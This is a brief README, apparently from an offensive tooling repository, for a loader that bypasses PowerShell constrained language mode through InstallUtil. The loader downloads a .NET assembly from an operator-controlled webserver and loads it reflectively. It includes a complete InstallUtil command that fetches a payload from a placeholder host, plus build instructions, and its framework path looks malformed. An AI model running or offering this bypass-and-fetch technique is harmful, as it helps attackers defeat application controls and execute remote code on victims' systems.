# CLM Loader
This was made to bypass constrained language mode using installutil.
It works by making a HTTP request to your webserver and loading whatever .NET assembly you point it at via reflective loading.

For Ex.
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30.30319\InstallUtil.exe /logfile= /LogToConsole=false /uri=http://x.x.x.x/loader.exe /U "C:\Windows\Tasks\clmloader.exe"
```

Any of the payloads using `clm-reflection` will call this. Its important to note that compiling this with Mono mcs seemed to be break things so just compile it with visual studio and drop it in `/output/`.
